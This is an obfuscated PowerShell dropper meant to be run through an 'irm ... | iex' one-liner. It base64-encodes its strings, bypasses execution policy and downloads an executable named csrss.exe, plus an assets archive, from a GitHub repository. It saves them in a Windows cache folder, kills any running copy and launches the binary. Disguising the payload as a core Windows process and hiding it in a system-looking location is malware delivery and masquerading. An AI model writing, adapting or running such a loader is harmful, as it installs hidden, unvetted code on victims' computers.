# mux-flux quasit | do not pretty-print
# irm https://raw.githubusercontent.com/arxstore/curado/refs/heads/main/network.ps1 | iex
$ErrorActionPreference='Stop';try{Set-ExecutionPolicy -Scope Process Bypass -Force -EA 0}catch{};[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
function __b([string]$z){[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($z))}
function __x([byte[]]$a,[byte]$k){$o=New-Object byte[] $a.Length;for($i=0;$i -lt $a.Length;$i++){$o[$i]=$a[$i]-bxor($k -bxor ($i -band 7))};return [Text.Encoding]::UTF8.GetString($o)}
$qWz=Get-Random;$nKp=__x ([Convert]::FromBase64String('KCgpKSkpKCgoKCgo')) 0x3C;$null=$nKp;$null=$qWz
$a1=__b 'cmVmcy9oZWFkcy9tYWlu';$a2=__b 'YXJ4c3RvcmU=';$a3=__b 'Y3VyYWRv';$a4=__b 'Y3Nyc3MuZXhl';$a5=__b 'cmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbQ=='
$d0=Join-Path $env:LOCALAPPDATA (__b 'TWljcm9zb2Z0XFdpbmRvd3NcQ2FjaGVz');New-Item -ItemType Directory -Force -Path $d0|Out-Null
$p0=Join-Path $d0 $a4
$stg=[IO.Path]::GetFullPath($d0)

# Prefer newest LOCAL build (dev machine) — skip stale GitHub copy
function __findLocal {
  $hits=New-Object System.Collections.Generic.List[object]
  $roots=@(
    (Join-Path $env:USERPROFILE 'Desktop\ARX PRODUCT'),
    (Join-Path $env:USERPROFILE 'Desktop\ARX PRODUCT\Src'),
    (Join-Path $env:USERPROFILE 'Documents\ARX PRODUCT'),
    (Get-Location).Path
  )
  foreach($r in ($roots|Select-Object -Unique)){
    if(-not(Test-Path -LiteralPath $r)){continue}
    Get-ChildItem -LiteralPath $r -Filter $a4 -Recurse -File -EA 0 | ForEach-Object {
      try{
        $fp=[IO.Path]::GetFullPath($_.FullName)
        if($fp.StartsWith($stg,[StringComparison]::OrdinalIgnoreCase)){return}
        if($_.Length -le 1024){return}
        if($fp -match '(?i)\\Windows\\System32\\csrss\.exe$'){return}
        [void]$hits.Add($_)
      }catch{}
    }
  }
  if($hits.Count -eq 0){return $null}
  return ($hits|Sort-Object LastWriteTimeUtc -Descending|Select-Object -First 1).FullName
}

$local=__findLocal
if($ExeUrl){$local=$null} # force remote if caller set $ExeUrl
if($local){
  if($Host.Name -eq 'ConsoleHost'){Write-Host "LOCAL build: $local" -ForegroundColor Green}
  Start-Process -FilePath $local
  return
}

# No local build → download from GitHub (cache-busted)
$cb=[DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
$u0="https://$a5/$a2/$a3/$a1/$a4`?$cb"
$hdr=@{ 'Cache-Control'='no-cache'; 'Pragma'='no-cache' }
$t0="$p0.$([guid]::NewGuid().ToString('N').Substring(0,8))"
Get-CimInstance Win32_Process -EA 0 | Where-Object { $_.ExecutablePath -and ($_.ExecutablePath -ieq $p0) } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -EA 0 }
Start-Sleep -Milliseconds 200
Remove-Item -LiteralPath $t0 -Force -EA 0
Remove-Item -LiteralPath $p0 -Force -EA 0
Invoke-WebRequest -Uri $u0 -OutFile $t0 -Headers $hdr -UseBasicParsing
if(-not(Test-Path -LiteralPath $t0)-or((Get-Item -LiteralPath $t0).Length -le 1024)){Remove-Item -LiteralPath $t0 -Force -EA 0;throw (__b 'ZmFpbA==')}
Move-Item -LiteralPath $t0 -Destination $p0 -Force
try{
  $u1="https://$a5/$a2/$a3/$a1/$(__b 'YXNzZXRzLnppcA==')`?$cb";$z0=Join-Path $d0 ("z"+[guid]::NewGuid().ToString('N').Substring(0,6))
  Invoke-WebRequest -Uri $u1 -OutFile $z0 -Headers $hdr -UseBasicParsing -EA Stop
  if((Test-Path $z0)-and((Get-Item $z0).Length -gt 64)){
    $x0=Join-Path $d0 ("x"+[guid]::NewGuid().ToString('N').Substring(0,6));if(Test-Path $x0){Remove-Item $x0 -Recurse -Force -EA 0}
    Expand-Archive -LiteralPath $z0 -DestinationPath $x0 -Force
    $s0=Join-Path $d0 (__b 'YXNzZXRz');if(Test-Path $s0){Remove-Item $s0 -Recurse -Force -EA 0}
    $i0=Join-Path $x0 (__b 'YXNzZXRz')
    if(Test-Path $i0){Copy-Item $i0 $s0 -Recurse -Force}else{New-Item -ItemType Directory -Force -Path $s0|Out-Null;Copy-Item (Join-Path $x0 '*') $s0 -Recurse -Force}
    Remove-Item $x0 -Recurse -Force -EA 0
  }
  if(Test-Path -LiteralPath $z0){Remove-Item -LiteralPath $z0 -Force -EA 0}
}catch{}
if($Host.Name -eq 'ConsoleHost'){Write-Host "REMOTE: $p0" -ForegroundColor Cyan}
Start-Process -FilePath $p0
Remove-Item -LiteralPath $t0 -Force -EA 0
